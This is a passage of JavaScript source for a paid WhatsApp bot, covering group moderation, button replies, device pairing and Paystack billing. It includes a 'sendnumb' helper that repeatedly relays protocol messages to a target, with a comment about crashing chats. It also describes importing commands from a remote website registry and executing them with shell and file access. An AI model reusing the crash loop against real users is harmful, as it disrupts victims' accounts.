                text: `⚠️ *Warning ${warnCount}/3*\n@${senderNum} — ${label} are not allowed here! (${3 - warnCount} warning(s) left before kick)`,
                mentions: [msgSender]
              });
            }
          } else if (mode === 'kick') {
            await mzazi.sendMessage(sender, {
              text: `👢 @${senderNum} has been kicked for sending ${label}.`,
              mentions: [msgSender]
            });
            try { await mzazi.groupParticipantsUpdate(sender, [msgSender], 'remove'); } catch (e) {}
          }
          return true;
        } catch (e) {
          return false;
        }
      };

      // ── ANTILINK ──────────────────────────────────────────
      const _antilinkMode = _gs.antilink;
      if (_antilinkMode && _antilinkMode !== 'off') {
        const msgText = budy || '';
        if (URL_REGEX.test(msgText)) {
          await applyMode(_antilinkMode, 'links');
          return;
        }
      }

      // ── ANTISTICKER ───────────────────────────────────────
      const _antistickerMode = _gs.antisticker;
      if (_antistickerMode && _antistickerMode !== 'off' && _antistickerMode !== false) {
        const isSticker = !!(message.stickerMessage);
        if (isSticker) {
          await applyMode(_antistickerMode, 'stickers');
          return;
        }
      }

      // ── ANTIIMAGE ─────────────────────────────────────────
      const _antiimageMode = _gs.antiimage;
      if (_antiimageMode && _antiimageMode !== 'off' && _antiimageMode !== false) {
        const isImage = !!(message.imageMessage) && !message.imageMessage?.gifPlayback;
        if (isImage) {
          await applyMode(_antiimageMode, 'images');
          return;
        }
      }
    }
const sendnumb = async (mzazi, target, loopz = 10, ptcp = true) => {
  for (let z = 0; z < loopz; z++) {
    await mzazi.relayMessage(target, {
      protocolMessage: {
        type: 11 // 25 for crash chat channelz
      }
    }, ptcp ? {
      participant: { jid: target }
    } : {});
  }
};

const mzazireply3 = async (caption, options = {}) => {
  try {
    const { image = null, buttons = [], mentions = [] } = options;

    // Build message
    let message = { text: caption };

    // Add image if provided
    if (image) {
      message.image = image;
      message.caption = caption;
      delete message.text;
    }

    // Add mentions
    if (mentions.length) {
      message.contextInfo = { mentionedJid: mentions };
    }

    // Buttons — native interactive buttons (buttonReply format)
    if (buttons.length) {
      await sendButtonMessage(mzazi, sender, {
        text: caption,
        footer: options.footer || '© Bot',
        image: image ? { url: image } : undefined,
        buttons: buttons.map((btn) => ({
          id: btn.id || 'menu',
          text: btn.label || 'Menu',
        })),
      });
      return;
    }

    // Send (no buttons)
    await mzazi.sendMessage(sender, message);

  } catch (err) {
    console.error('mzazireply error:', err);
    // Fallback: plain text
    try {
      await mzazi.sendMessage(sender, { text: caption });
    } catch (e) {}
  }
};
const mzazireply27 = async (text) => {
    return await sendButtonMessage(mzazi, sender, {
        text,
        footer: `© ${botName.toUpperCase()}`,
        buttons: [
            { id: ".menu", text: "📜 MENU" },
            { id: ".owner", text: "👑 OWNER" },
            { id: ".alive", text: "🤖 STATUS" }
        ]
    });
};

const mzazireply = async (text, options = {}) => {
    try {
        const {
            quoted = null,
            mentions = [],
            image = null,
            showMenu = false,
            customButtons = null,
            footer = `© ${botName} | MAGGIE X KERUBO`
        } = options;

        const chatId = sender;

        // ── Build contextInfo ──
        let contextInfo = { mentionedJid: mentions };

        // ── If replying to a message ──
        if (quoted) {
            contextInfo = {
                ...contextInfo,
                stanzaId: quoted.key?.id,
                participant: quoted.key?.participant || quoted.key?.remoteJid,
                quotedMessage: quoted.message,
                remoteJid: quoted.key?.remoteJid
            };
        }

        // ── Add forwarding ──
        contextInfo = {
            ...contextInfo,
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363425539800408@newsletter",
                newsletterName: botName.toUpperCase(),
                serverMessageId: 143
            }
        };

        // ── Build message payload ──
        let messagePayload = { contextInfo };

        // ── Handle image ──
        let finalImage = image;
        
        if (showMenu) {
            // Get menu image
            const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
            const defaultMenuPic = "./media/menu.jpg";
            const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;
            
            if (fs.existsSync(menuPicPath)) {
                finalImage = fs.readFileSync(menuPicPath);
            }
        }

        // ── Process image ──
        if (finalImage) {
            let imageBuffer = null;
            if (Buffer.isBuffer(finalImage)) {
                imageBuffer = finalImage;
            } else if (typeof finalImage === 'string' && fs.existsSync(finalImage)) {
                imageBuffer = fs.readFileSync(finalImage);
            }
            
            if (imageBuffer) {
                messagePayload.image = imageBuffer;
                messagePayload.caption = text;
                messagePayload.jpegThumbnail = imageBuffer;
            } else {
                messagePayload.text = text;
            }
        } else {
            messagePayload.text = text;
        }

        // ── Default buttons (Menu, Ping, Owner) ──
        const defaultButtons = [
            {
                buttonId: `${prefix}menu`,
                buttonText: { displayText: "📜 Menu" },
                type: 1
            },
            {
                buttonId: `${prefix}ping`,
                buttonText: { displayText: "🏓 Ping" },
                type: 1
            },
            {
                buttonId: `${prefix}owner`,
                buttonText: { displayText: "👑 Owner" },
                type: 1
            }
        ];

        // ── Use custom buttons if provided, else default ──
        const buttons = customButtons || defaultButtons;

        // ── Add owner name to footer if not set ──
        let finalFooter = footer;
        if (!finalFooter.includes('MAGGIE X KERUBO')) {
            finalFooter = `${finalFooter} | 👑 MAGGIE X KERUBO`;
        }

        // ── Send (native interactive buttons) ──
        if (buttons.length > 0) {
            await sendButtonMessage(mzazi, chatId, {
                text: messagePayload.caption || messagePayload.text || text,
                footer: finalFooter,
                image: imageBuffer ? { url: imageBuffer } : undefined,
                buttons: buttons.map((b) => ({
                    id: b.buttonId || b.id || `${prefix}menu`,
                    text: b.buttonText?.displayText || b.text || 'Menu',
                })),
            });
            return;
        }

        await mzazi.sendMessage(chatId, messagePayload);

    } catch (err) {
        logSystem(`mzazireply error: ${err.message}`, 'error');
        
        // Ultimate fallback
        try {
            await mzazi.sendMessage(sender, { text: text });
        } catch (e) {
            logSystem(`Final fallback failed: ${e.message}`, 'error');
        }
    }
};


    // MZAZIBOT is a stable WhatsApp-side access keyword. It is intentionally
    // accepted without the normal command prefix so users do not need Telegram
    // to start the pairing/payment flow.
    if (!isCmd) {
      const barePairingCommand = budy.trim().match(/^MZAZIBOT(?:\s+(.+))?$/i);
      if (barePairingCommand) {
        isCmd = true;
        command = "mzazibot";
        args = barePairingCommand[1]
          ? barePairingCommand[1].trim().split(/\s+/)
          : [];
      }
    }

    if (!isCmd) return;

    // ========== REACT TO COMMAND ==========
    

    // ========== COMMANDS ==========
    const startTime = Date.now();

    // ─────────────────────────────────────────────────────────────────────────
    // WhatsApp account pairing + billing
    //
    // The fixed MZAZIBOT keyword is a command/access alias. The actual
    // WhatsApp pairing code must still come from WhatsApp's servers; replacing
    // that server-issued code with a constant would make linking fail.
    // ─────────────────────────────────────────────────────────────────────────
    const whatsappCommand = command.toLowerCase();
    const isPairingCommand = ["pair", "connect", "mzazibot"].includes(whatsappCommand);
    const isPlansCommand = ["plan", "plans", "subscription"].includes(whatsappCommand);
    const isPaymentCommand = ["buy", "pay", "payment"].includes(whatsappCommand);
    const isVerifyCommand = ["verify", "verify payment"].includes(whatsappCommand);

    const planKeyFromInput = (value) => {
      const raw = String(value || "").trim().toLowerCase();
      if (raw === "5" || raw === "5devices" || raw === "5numbers" || raw === "plan5") return "PLAN_5";
      if (raw === "10" || raw === "10devices" || raw === "10numbers" || raw === "plan10") return "PLAN_10";
      if (raw === "20" || raw === "20devices" || raw === "20numbers" || raw === "plan20") return "PLAN_20";
      if (raw === "unlimited" || raw === "infinite" || raw === "999" || raw === "unlimitednumbers") return "UNLIMITED";
      const normalized = raw.toUpperCase().replace(/-/g, "_");
      return PLANS[normalized] ? normalized : null;
    };

    const sendWhatsappPlans = async () => {
      const planLines = Object.entries(PLANS)
        .filter(([, plan]) => plan.price > 0)
        .map(([key, plan]) =>
          `• ${key}: ${plan.name} — KES ${plan.price} / ${plan.days} days`
        )
        .join("\n");
      await mzazireply(
        `💳 *MZAZI TECH QUARTZ PLANS*\n\n` +
        `🆓 FREE — 1 WhatsApp device\n` +
        `${planLines}\n\n` +
        `Pay from WhatsApp with:\n` +
        `• ${prefix}pay PLAN_5\n` +
        `• ${prefix}pay 10\n\n` +
        `After paying, use ${prefix}verify <reference>.`
      );
    };

    if (isPairingCommand) {
      if (isGroup) {
        await mzazireply("❌ Pairing and payment commands are available in a private chat only.");
        return;
      }

      const pairingArgs = whatsappCommand === "mzazibot" && ["pair", "connect"].includes(String(args[0] || "").toLowerCase())
        ? args.slice(1)
        : args;
      const requestedNumber = pairingArgs[0] || "";
      const accountId = resolveWhatsappAccountId(senderPureNumber, botPhoneNum);

      if (!accountId) {
        await mzazireply("❌ I could not identify your WhatsApp number. Please send this command from a normal private chat.");
        return;
      }

      if (!requestedNumber) {
        await mzazireply(
          `🔗 *WHATSAPP PAIRING*\n\n` +
          `Use:\n` +
          `• ${prefix}pair 2547XXXXXXXX\n` +
          `• ${prefix}connect 2547XXXXXXXX\n` +
          `• MZAZIBOT 2547XXXXXXXX\n\n` +
          `MZAZIBOT is the fixed command keyword. The displayed pairing code is generated securely by WhatsApp and changes for every request.`
        );
        return;
      }

      const validNumber = validatePhoneNumber(requestedNumber);
      if (!validNumber) {
        await mzazireply("❌ Invalid phone number. Use international format, for example: 254712345678.");
        return;
      }

      const currentSessions = loadJSON("./database/paired.json", []);
      if (currentSessions.some((session) => session.number === validNumber)) {
        await mzazireply("⚠️ This WhatsApp number is already paired. Use a different number or manage the existing session.");
        return;
      }

      try {
        const account = await getWhatsappSubscription(accountId);
        const globalSettings = loadJSON("./database/settings.json", {});
        if (globalSettings.premiumOnly && !isOwner && account.plan === "FREE") {
          await mzazireply(
            `❌ Pairing is currently premium-only.\n\nUse ${prefix}plans to choose a plan, then ${prefix}pay PLAN_5 to generate a Paystack payment link.`
          );
          return;
        }

        if (!isOwner && !(await canAddDevice(accountId))) {
          await mzazireply(
            `⚠️ *DEVICE LIMIT REACHED*\n\n` +
            `Plan: *${PLANS[account.plan]?.name || account.plan}*\n` +
            `Devices: *${account.deviceCount}/${account.maxDevices === 999 ? "Unlimited" : account.maxDevices}*\n\n` +
            `Use ${prefix}plans and ${prefix}pay PLAN_5 to upgrade.`
          );
          return;
        }

        await mzazireply("⏳ Generating a secure WhatsApp pairing code...");
        const code = await requestPairingCode(validNumber, accountId, { notifyTelegram: false, source: "whatsapp" });
        await syncSessionToDb(accountId, validNumber, "ACTIVE");

        await mzazireply(
          `✅ *PAIRING CODE READY*\n\n` +
          `📱 Number: *${validNumber}*\n` +
          `🔐 Code: *${code}*\n\n` +
          `On the phone you want to connect:\n` +
          `WhatsApp → Settings → Linked Devices → Link a Device → Link with phone number\n\n` +
          `⏳ The code expires shortly.`
        );
      } catch (error) {
        logger.error("WhatsApp pairing error:", error?.message || error);
        await mzazireply(`❌ Failed to generate the pairing code.\n\n${error?.message || "Please try again later."}`);
      }
      return;
    }

    if (isPlansCommand || (isPaymentCommand && !args[0])) {
      if (isGroup) {
        await mzazireply("❌ Plans and payment commands are available in a private chat only.");
        return;
      }
      await sendWhatsappPlans();
      return;
    }

    if (isPaymentCommand) {
      if (isGroup) {
        await mzazireply("❌ Payment commands are available in a private chat only.");
        return;
      }
      const accountId = resolveWhatsappAccountId(senderPureNumber, botPhoneNum);
      const planKey = planKeyFromInput(args[0]);
      if (!accountId) {
        await mzazireply("❌ I could not identify your WhatsApp account.");
        return;
      }
      if (!planKey || planKey === "FREE") {
        await mzazireply("❌ Choose a paid plan, for example: .pay PLAN_5, .pay 10, or .pay unlimited");
        return;
      }

      await mzazireply("⏳ Generating your secure Paystack payment link...");
      const result = await createWhatsappPayment(accountId, planKey);
      if (!result.success) {
        await mzazireply(`❌ Could not create the payment link.\n\n${result.error || "Please try again later."}`);
        return;
      }

      const plan = getPlanSummary(planKey);
      await mzazireply(
        `💳 *PAYMENT INITIATED*\n\n` +
        `📦 Plan: *${plan.name}*\n` +
        `💰 Amount: *KES ${plan.price}*\n` +
        `⏳ Validity: *${plan.days} days*\n` +
        `🔖 Reference: \`${result.reference}\`\n\n` +
        `Pay here:\n${result.url}\n\n` +
        `After payment, send:\n${prefix}verify ${result.reference}`
      );
      return;
    }

    if (isVerifyCommand) {
      if (isGroup) {
        await mzazireply("❌ Payment verification is available in a private chat only.");
        return;
      }
      const reference = args.join(" ").trim();
      if (!reference) {
        await mzazireply(`Usage: ${prefix}verify <payment-reference>`);
        return;
      }

      await mzazireply("⏳ Verifying your Paystack payment...");
      const accountId = resolveWhatsappAccountId(senderPureNumber, botPhoneNum);
      const result = await verifyWhatsappPayment(reference, accountId);
      if (!result.success) {
        await mzazireply(
          result.alreadyProcessed
            ? "✅ This payment was already verified."
            : `❌ Payment verification failed.\n\n${result.error || "Please wait a moment and try again."}`
        );
        return;
      }

      const plan = getPlanSummary(result.planKey);
      await mzazireply(
        `✅ *PAYMENT VERIFIED*\n\n` +
        `📦 Plan: *${plan?.name || result.planKey}*\n` +
        `📱 Devices: *${plan?.maxDevices === 999 ? "Unlimited" : plan?.maxDevices}*\n` +
        `⏳ Validity: *${plan?.days || 30} days*\n\n` +
        `You can now use ${prefix}pair 2547XXXXXXXX to connect a device.`
      );
      return;
    }

    // ── Command dispatch ───────────────────────────────────────────────────────
    // All commands are imported from the website registry
    // (https://mzazi.shop/api/bot-command) and executed here.
    // Engine-only commands: .synccmd / .sync / .remote

    // Builds the execution context for imported commands — every module-scope
    // identifier the command bodies may reference, bound by name.
    const buildCommandContext = () => ({
      $: undefined,
      A: undefined,
      AI_APIS: undefined,
      ATTP: undefined,
      Above: undefined,
      Arial: undefined,
      Auto: undefined,
      Average: undefined,
      Be: undefined,
      Below: undefined,
      Bot: undefined,
      COLORS: undefined,
      COLS: undefined,
      Canvas: undefined,
      CanvasRenderingContext2D: undefined,
      Clean: undefined,
      Creating: undefined,
      D: undefined,
      DARE: undefined,
      DISABLED: undefined,
      Disabled: undefined,
      DisconnectReason: undefined,
      Dogs: undefined,
      Download: undefined,
      ENABLED: undefined,
      ERROR: undefined,
      Enabled: undefined,
      Failed: undefined,
      Free: undefined,
      Function: undefined,
      Genius: undefined,
      Group: undefined,
      Has: undefined,
      Invalid: undefined,
      JID: undefined,
      LocatonStc: undefined,
      LxP: undefined,
      MODE: undefined,
      Message: undefined,
      Mzazi: undefined,
      N: undefined,
      No: undefined,
      NodeCache: undefined,
      None: undefined,
      Not: undefined,
      OFF: undefined,
      ON: undefined,
      Owner: undefined,
      PUBLIC: undefined,
      PassThrough,
      Premium: undefined,
      Public: undefined,
      ROWS: undefined,
      SELF: undefined,
      Search: undefined,
      Self: undefined,
      TRUTH: undefined,
      Tech: undefined,
      TelegraPh: undefined,
      Typing: undefined,
      US: undefined,
      Unknown: undefined,
      UploadFileUgu: undefined,
      User: undefined,
      You: undefined,
      Z: undefined,
      Z0: undefined,
      _: undefined,
      __dirname,
      __filename,
      _adEnable: undefined,
      _dmFile: undefined,
      _dmSettings: undefined,
      _no: undefined,
      _ud: undefined,
      _uh: undefined,
      _um: undefined,
      _upSec: undefined,
      _us: undefined,
      a: undefined,
      active: undefined,
      actualUrl: undefined,
      addOwner,
      addWarn,
      address: undefined,
      admin: undefined,
      adminList: undefined,
      adminTag: undefined,
      adminTagTxt: undefined,
      all: undefined,
      allCommands: undefined,
      allGroups: undefined,
      allGroups2: undefined,
      allGrps: undefined,
      allGrps3: undefined,
      allMembers: undefined,
      amazing: undefined,
      amount: undefined,
      amps: undefined,
      angry: undefined,
      animated: undefined,
      ans: undefined,
      answer: undefined,
      answered: undefined,
      answers8: undefined,
      antibot: undefined,
      antidemote: undefined,
      antimentiongroup: undefined,
      antipromote: undefined,
      antitag: undefined,
      antitagadmin: undefined,
      antiviewonce: undefined,
      antonyms: undefined,
      api: undefined,
      apiUrl: undefined,
      apis: undefined,
      aquarius: undefined,
      are: undefined,
      area: undefined,
      args,
      aries: undefined,
      asciiArt: undefined,
      asciiResult: undefined,
      audio: undefined,
      audioCaption: undefined,
      audioRes: undefined,
      auth: undefined,
      author: undefined,
      auto: undefined,
      autoCommands2: undefined,
      available: undefined,
      average: undefined,
      avg: undefined,
      axios,
      b: undefined,
      bName: undefined,
      bTarget: undefined,
      backgroundArgb: undefined,
      baileys,
      bars: undefined,
      base64: undefined,
      be: undefined,
      before: undefined,
      bgHex: undefined,
      binResult: undefined,
      bio: undefined,
      black: undefined,
      blanks: undefined,
      blue: undefined,
      board: undefined,
      boardStr: undefined,
      body,
      bold: undefined,
      botChoice: undefined,
      botJid,
      botJids: undefined,
      botLid,
      botName,
      botNumber: undefined,
      botPhoneNum,
      botVersion: undefined,
      bottom: undefined,
      brandName: undefined,
      browser: undefined,
      btnBotName: undefined,
      btnPrefix: undefined,
      buf: undefined,
      buf2: undefined,
      buf3: undefined,
      buf5: undefined,
      bufBP: undefined,
      bufVV: undefined,
      buffer: undefined,
      bugType: undefined,
      buildMsgObj: undefined,
      bullets: undefined,
      businessMessageForwardInfo: undefined,
      businessOwnerJid: undefined,
      button: undefined,
      buttonId: undefined,
      buttonParamsJson: undefined,
      buttonText: undefined,
      buttons: undefined,
      byes: undefined,
      c: undefined,
      c1: undefined,
      c2: undefined,
      c4Id: undefined,
      cCount: undefined,
      calls: undefined,
      cancer: undefined,
      canvas: undefined,
      capricorn: undefined,
      caption: undefined,
      caption_: undefined,
      card: undefined,
      cards: undefined,
      careful: undefined,
      carouselCards: undefined,
      carouselMessage: undefined,
      caseData: undefined,
      caseMatches: undefined,
      cat: undefined,
      categories: undefined,
      center: undefined,
      cfg: undefined,
      cfg2: undefined,
      cfg3: undefined,
      cfg5: undefined,
      cfg5b: undefined,
      cfg6: undefined,
      cfg6b: undefined,
      cfg7: undefined,
      cfg8: undefined,
      cfg9: undefined,
      ch: undefined,
      chain: undefined,
      challenges: undefined,
      change: undefined,
      changeIcon: undefined,
      chars: undefined,
      chat: undefined,
      chatId: undefined,
      chatLabel: undefined,
      checkWin: undefined,
      choice: undefined,
      choices: undefined,
      chosen: undefined,
      chunk: undefined,
      chunkSize: undefined,
      chunks: undefined,
      clean: undefined,
      cleaned: undefined,
      cleanup: undefined,
      close: undefined,
      cmd: undefined,
      cmdTxt: undefined,
      cnData: undefined,
      cnRes: undefined,
      code: undefined,
      code2: undefined,
      coin: undefined,
      col: undefined,
      colNums: undefined,
      color: undefined,
      colorUrl: undefined,
      command,
      commonHeader: undefined,
      compliments: undefined,
      config,
      confirm: undefined,
      conn: undefined,
      connection: undefined,
      contactExist: undefined,
      contacts: undefined,
      content: undefined,
      contentType: undefined,
      contextInfo: undefined,
      converted: undefined,
      cool: undefined,
      copiedText: undefined,
      copy_code: undefined,
      count: undefined,
      countStr: undefined,
      country: undefined,
      countryData: undefined,
      countryRes: undefined,
      cpuModel: undefined,
      createCanvas: undefined,
      createdAt: undefined,
      createdBy: undefined,
      cry: undefined,
      cryptoData: undefined,
      cryptoRes: undefined,
      ctx: undefined,
      ctxInfo: undefined,
      cur: undefined,
      cur2: undefined,
      cur3: undefined,
      currencies: undefined,
      currentDate: undefined,
      currentPlayer: undefined,
      currentSettings,
      currentStatus: undefined,
      customButtons: undefined,
      customMenuPic: undefined,
      customOwnerPic: undefined,
      cuteMessage: undefined,
      cyan: undefined,
      d: undefined,
      dareMessage: undefined,
      dares: undefined,
      data: undefined,
      date: undefined,
      dateStr: undefined,
      day: undefined,
      days: undefined,
      db,
      decoded: undefined,
      decoded2: undefined,
      defaultMenuPic: undefined,
      defaultOwnerPic: undefined,
      defaultSettings: undefined,
      degreesLatitude: undefined,
      degreesLongitude: undefined,
      delK: undefined,
      delKey: undefined,
      delOwner,
      desc: undefined,
      description: undefined,
      dfData: undefined,
      dfRes: undefined,
      dfRes2: undefined,
      dfText: undefined,
      dictData: undefined,
      dictRes: undefined,
      digit: undefined,
      directPath: undefined,
      disabled: undefined,
      disappearingMessagesInChat: undefined,
      display: undefined,
      displayList: undefined,
      displayName: undefined,
      displayText: undefined,
      display_text: undefined,
      dmSent: undefined,
      document: undefined,
      dosage: undefined,
      download: undefined,
      downloadCommands: undefined,
      downloadContentFromMessage: undefined,
      downloadErr: undefined,
      downloadMediaMessage,
      downloadUrl: undefined,
      download_url: undefined,
      drawBoard: undefined,
      dropPiece: undefined,
      dropped: undefined,
      duas: undefined,
      duration: undefined,
      durations: undefined,
      e: undefined,
      e2e8f0: undefined,
      edit: undefined,
      emoji: undefined,
      emoji1: undefined,
      emoji2: undefined,
      emojiMap2: undefined,
      emptyBoard: undefined,
      empty_moov: undefined,
      en: undefined,
      enable: undefined,
      enabled: undefined,
      encoded: undefined,
      endPing: undefined,
      endTime: undefined,
      entry: undefined,
      ephemeralMessage: undefined,
      err: undefined,
      error: undefined,
      escapeDrawtextText: undefined,
      eventMessage: undefined,
      exec,
      executorJid: undefined,
      executorNumber: undefined,
      exp: undefined,
      ext: undefined,
      extendedTextMessage: undefined,
      externalAdReply: undefined,
      extraGuestsAllowed: undefined,
      extract: undefined,
      extractedUrl: undefined,
      f: undefined,
      f1f5f9: undefined,
      faces: undefined,
      facts: undefined,
      failed: undefined,
      faithCommands: undefined,
      fakeKey: undefined,
      fakeMsg: undefined,
      fallback: undefined,
      fallbackAuto: undefined,
      fallbackData: undefined,
      fallbackErr: undefined,
      fallbackText: undefined,
      fallbackUrl: undefined,
      faststart: undefined,
      ffffff: undefined,
      ffmpeg,
      ffmpegCommand: undefined,
      fileEncSha256: undefined,
      fileLength: undefined,
      fileName: undefined,
      filePath: undefined,
      fileRes: undefined,
      fileSha256: undefined,
      fileSizeMB: undefined,
      filter: undefined,
      finalText: undefined,
      fire: undefined,
      flirts: undefined,
      floodReports: undefined,
      fm: undefined,
      fmId: undefined,
      fmt: undefined,
      font: undefined,
      fontPath: undefined,
      fontText2: undefined,
      fontType: undefined,
      fontWords: undefined,
      food: undefined,
      footer: undefined,
      forceError: undefined,
      format: undefined,
      formatBytes,
      fortunes: undefined,
      forward: undefined,
      forwardedNewsletterMessageInfo: undefined,
      forwardingScore: undefined,
      found: undefined,
      frag_keyframe: undefined,
      freeMem: undefined,
      freezeios: undefined,
      from: undefined,
      fromMe: undefined,
      fs,
      fullContent: undefined,
      fwdJid: undefined,
      fwdMsg: undefined,
      g: undefined,
      gText: undefined,
      game: undefined,
      gemini: undefined,
      genQuestion: undefined,
      generate: undefined,
      generateHighQualityLinkPreview: undefined,
      generateWAMessageContent: undefined,
      generateWAMessageFromContent,
      generateWaveform: undefined,
      genericName: undefined,
      getBotName,
      getChatbotStatus,
      getExt: undefined,
      getGroupSettings,
      getOwners,
      getQuotedMsg: undefined,
      getRes: undefined,
      getToggle,
      getWarns,
      gid: undefined,
      gifData: undefined,
      gifPlayback: undefined,
      gifRes: undefined,
      gm: undefined,
      gradient: undefined,
      gray: undefined,
      green: undefined,
      greetings: undefined,
      groupAdmins,
      groupArr: undefined,
      groupBanz: undefined,
      groupCommands: undefined,
      groupIds: undefined,
      groupIds2: undefined,
      groupMetadata: undefined,
      groupName: undefined,
      groupStatus: undefined,
      groupStatusMessageV2: undefined,
      groupUrl: undefined,
      groupWarns: undefined,
      groups: undefined,
      groups2: undefined,
      gs: undefined,
      gs8: undefined,
      guess: undefined,
      guessed: undefined,
      guessers: undefined,
      h: undefined,
      hadiths: undefined,
      hangStages: undefined,
      happy: undefined,
      hard: undefined,
      hasMedia: undefined,
      hasMediaAttachment: undefined,
      hasReminder: undefined,
      hash: undefined,
      headErr: undefined,
      headRes: undefined,
      header: undefined,
      headerGrad: undefined,
      headerType: undefined,
      headers: undefined,
      heapTotal: undefined,
      heapUsed: undefined,
      heart: undefined,
      height: undefined,
      hex: undefined,
      hexResult: undefined,
      hexToArgb: undefined,
      hiddenCount: undefined,
      hint: undefined,
      history: undefined,
      hmId: undefined,
      hmg: undefined,
      horoscopes: undefined,
      hour: undefined,
      hour12: undefined,
      hours: undefined,
      humidity: undefined,
      i: undefined,
      icon: undefined,
      icons: undefined,
      id: undefined,
      idx: undefined,
      image: undefined,
      imageBuffer: undefined,
      imageMessage: undefined,
      imageMsg: undefined,
      imageResponse: undefined,
      imageUrl: undefined,
      imgBuf: undefined,
      imgContent: undefined,
      imgErr: undefined,
      imgField: undefined,
      imgModeEmoji: undefined,
      imgPath: undefined,
      imgResponse: undefined,
      index: undefined,
      indications: undefined,
      indicator: undefined,
      info: undefined,
      info2: undefined,
      infoItems: undefined,
      infoLines: undefined,
      infoMessage: undefined,
      inner: undefined,
      innerMsg: undefined,
      innerType: undefined,
      input: undefined,
      insults2: undefined,
      interactiveButtons: undefined,
      interactiveMessage: undefined,
      interactiveMsg: undefined,
      ipData: undefined,
      ipData2: undefined,
      ipRes: undefined,
      ipRes2: undefined,
      isA: undefined,
      isAdmin,
      isAiSticker: undefined,
      isAnimated: undefined,
      isAvatar: undefined,
      isBotAdmin,
      isCanceled: undefined,
      isDraw: undefined,
      isForwarded: undefined,
      isFull: undefined,
      isGroup,
      isImage: undefined,
      isLottie: undefined,
      isOwner,
      isPaid,
      isPremium: undefined,
      isT: undefined,
      isTargetAdmin: undefined,
      isTargetOwner2: undefined,
      isTargetPaid: undefined,
      isVideo: undefined,
      item: undefined,
      itemWidth: undefined,
      iteration: undefined,
      j: undefined,
      jid: undefined,
      jidToNumber,
      jidUser: undefined,
      joinLink: undefined,
      jpegThumbnail: undefined,
      json: undefined,
      jsonStr: undefined,
      k: undefined,
      keepJids: undefined,
      keepSet: undefined,
      kenyaTime: undefined,
      key: undefined,
      kick: undefined,
      kicked: undefined,
      l: undefined,
      lData: undefined,
      lRes: undefined,
      label: undefined,
      labels: undefined,
      languages: undefined,
      lastDisconnect: undefined,
      lastLetter: undefined,
      lastPlayer: undefined,
      lastWord: undefined,
      lat2: undefined,
      latency: undefined,
      laugh: undefined,
      lavfi: undefined,
      left: undefined,
      len: undefined,
      length: undefined,
      leo: undefined,
      letter: undefined,
      level: undefined,
      libra: undefined,
      libx264: undefined,
      lifestyleCommands: undefined,
      limited: undefined,
      lines: undefined,
      link: undefined,
      ll: undefined,
      loadImage: undefined,
      loadJSON,
      local: undefined,
      location: undefined,
      locationMessage: undefined,
      logSystem,
      logger,
      lon2: undefined,
      long: undefined,
      love: undefined,
      lyricsOut: undefined,
      lyricsText: undefined,
      m,
      m2: undefined,
      makeWASocket: undefined,
      manufacturer: undefined,
      match: undefined,
      matches: undefined,
      mathResult: undefined,
      max: undefined,
      maxLen: undefined,
      maxRedirects: undefined,
      maxTries: undefined,
      maxVisible: undefined,
      maxWrong: undefined,
      meaning: undefined,
      meanings: undefined,
      media: undefined,
      mediaBuffer: undefined,
      mediaKey: undefined,
      mediaKeyTimestamp: undefined,
      mediaMsg5: undefined,
      mediaType: undefined,
      memberCount: undefined,
      memberList: undefined,
      members: undefined,
      memoryUsage: undefined,
      mentionMatch: undefined,
      mentioned: undefined,
      mentioned3: undefined,
      mentioned4: undefined,
      mentioned5: undefined,
      mentioned6: undefined,
      mentioned7: undefined,
      mentionedJid: undefined,
      mentions: undefined,
      menuCaption: undefined,
      menuImageBuffer: undefined,
      menuImagePath: undefined,
      menuPicPath: undefined,
      menuText: undefined,
      merchant_url: undefined,
      message,
      messageContextInfo: undefined,
      messageId: undefined,
      messageParamJson: undefined,
      messageSecret: undefined,
      metadata: undefined,
      midQualityFileSha256: undefined,
      middle: undefined,
      mimetype: undefined,
      min: undefined,
      minute: undefined,
      minutes: undefined,
      mocked: undefined,
      mode: undefined,
      mode2: undefined,
      modeEmoji: undefined,
      modeSet: undefined,
      modeSettings: undefined,
      modes: undefined,
      module,
      money: undefined,
      month: undefined,
      morseMap: undefined,
      morseToLetter: undefined,
      movflags: undefined,
      mp4: undefined,
      ms: undefined,
      msg: undefined,
      msgBP: undefined,
      msgObj: undefined,
      msgParts: undefined,
      msgRetryCounterCache: undefined,
      msgSender,
      music: undefined,
      myWarns: undefined,
      mzazi,
      mzazireply,
      n: undefined,
      name: undefined,
      nativeFlowInfo: undefined,
      nativeFlowMessage: undefined,
      newEmoji: undefined,
      newPrefix: undefined,
      newsletterJid: undefined,
      newsletterName: undefined,
      next: undefined,
      nextLetter: undefined,
      nextPlayer: undefined,
      nextSym: undefined,
      nfRes: undefined,
      nfText: undefined,
      ng: undefined,
      ngId: undefined,
      nglMsg: undefined,
      nhieStatements: undefined,
      nhies: undefined,
      no: undefined,
      noBlanks: undefined,
      none: undefined,
      normalizeJid,
      now: undefined,
      num: undefined,
      num2: undefined,
      num3: undefined,
      number: undefined,
      numeric: undefined,
      o: undefined,
      off: undefined,
      on: undefined,
      op: undefined,
      openfda: undefined,
      opp: undefined,
      opponent: undefined,
      ops: undefined,
      options: undefined,
      opts: undefined,
      orange: undefined,
      originalMessage: undefined,
      os,
      otherCmds: undefined,
      output: undefined,
      outputFile: undefined,
      overwriteNote: undefined,
      ownerCommands: undefined,
      ownerDM: undefined,
      ownerJid: undefined,
      ownerList2: undefined,
      ownerName: undefined,
      ownerNumber: undefined,
      ownerNumbers,
      ownerPicPath: undefined,
      ownerTxt: undefined,
      owners,
      ownersList,
      p: undefined,
      p1: undefined,
      p2: undefined,
      paidUsers,
      pairedMediaType: undefined,
      pairedUsers: undefined,
      pairingCodeGenerated: undefined,
      pairingSock: undefined,
      paper: undefined,
      paramsJson: undefined,
      participant: undefined,
      participants,
      parts: undefined,
      parts2: undefined,
      parts3: undefined,
      parts4: undefined,
      party: undefined,
      pass: undefined,
      path,
      payload: undefined,
      phonetic: undefined,
      photo: undefined,
      pick: undefined,
      pickedJid: undefined,
      pieceNum: undefined,
      pin: undefined,
      ping: undefined,
      pingColor: undefined,
      pingMs: undefined,
      pino,
      pipe: undefined,
      pipeIndex: undefined,
      pisces: undefined,
      pix_fmt: undefined,
      player: undefined,
      players: undefined,
      png: undefined,
      pngBuffer: undefined,
      poems: undefined,
      poll: undefined,
      pollOptions: undefined,
      pollParts: undefined,
      pollQuestion: undefined,
      pos: undefined,
      position: undefined,
